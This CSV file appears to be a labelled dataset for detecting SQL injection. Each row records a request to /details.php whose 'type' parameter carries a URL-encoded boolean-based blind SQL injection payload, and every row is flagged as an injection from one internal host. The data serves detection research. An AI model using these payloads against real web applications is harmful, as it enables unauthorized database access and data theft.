full_url,event_time,hostname,injection
/details.php?prod=5&type=%3F%20WHERE%201872%3D1872%20AND%205104%3D5104--%20jiwZ,1681395121.324701,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x4b7a4851%20WHERE%201422%3D1422%20AND%203534%3D6852%29%7C%7C%27,1681395121.330245,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x63524349%20WHERE%209901%3D9901%20AND%205104%3D5104%29%7C%7C%27,1681395121.334302,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6f676e59%20FROM%20DUAL%20WHERE%202039%3D2039%20AND%206839%3D8740%29%7C%7C%27,1681395121.33777,192.168.43.6,1
/details.php?prod=5&type=%3F%27%7C%7C%28SELECT%200x6d5a4c6f%20FROM%20DUAL%20WHERE%202751%3D2751%20AND%205104%3D5104%29%7C%7C%27,1681395121.341457,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x7a486b43%20WHERE%208226%3D8226%20AND%205863%3D4891%29%2B%27,1681395121.345416,192.168.43.6,1
/details.php?prod=5&type=%3F%27%2B%28SELECT%200x6a7a464e%20WHERE%209157%3D9157%20AND%205104%3D5104%29%2B%27,1681395121.348494,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x536f4943%20FROM%20DUAL%20WHERE%209370%3D9370%20AND%206606%3D6884%29%7C%7C,1681395121.353168,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x715a537a%20FROM%20DUAL%20WHERE%207407%3D7407%20AND%205104%3D5104%29%7C%7C,1681395121.356607,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x6c546473%20WHERE%201569%3D1569%20AND%201177%3D2009%29%7C%7C,1681395121.360115,192.168.43.6,1
/details.php?prod=5&type=%3F%7C%7C%28SELECT%200x514f6455%20WHERE%202012%3D2012%20AND%205104%3D5104%29%7C%7C,1681395121.363679,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20HJzw%20WHERE%203523%3D3523%20AND%209163%3D4482%29%2B,1681395121.367831,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%20BVzU%20WHERE%209465%3D9465%20AND%205104%3D5104%29%2B,1681395121.371312,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x50685463%20WHERE%201608%3D1608%20AND%204052%3D4798%29%2B,1681395121.375621,192.168.43.6,1
/details.php?prod=5&type=%3F%2B%28SELECT%200x49585679%20WHERE%203729%3D3729%20AND%205104%3D5104%29%2B,1681395121.379432,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20BHIL%20WHERE%209663%3D9663%20AND%205321%3D6197--%20yxPD,1681395121.383002,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%29%20AS%20TbLd%20WHERE%208702%3D8702%20AND%205104%3D5104--%20Mlds,1681395121.386837,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20fJaz%20WHERE%209696%3D9696%20AND%209662%3D5358--%20FzTh,1681395121.39105,192.168.43.6,1
/details.php?prod=5&type=%3F%22%29%29%20AS%20fWxJ%20WHERE%206980%3D6980%20AND%205104%3D5104--%20QdLy,1681395121.394441,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20dbyL%20WHERE%208299%3D8299%20AND%209077%3D3500--%20RQRE,1681395121.402602,192.168.43.6,1
/details.php?prod=5&type=%3F%29%29%20AS%20NNVl%20WHERE%205965%3D5965%20AND%205104%3D5104--%20UMjn,1681395121.406532,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AS%20WGMi%20WHERE%206468%3D6468%20AND%201469%3D2100--%20ISMk,1681395121.411107,192.168.43.6,1
/details.php?prod=5&type=%3F%27%29%20AS%20hMin%20WHERE%207773%3D7773%20AND%205104%3D5104--%20vWaR,1681395121.414589,192.168.43.6,1
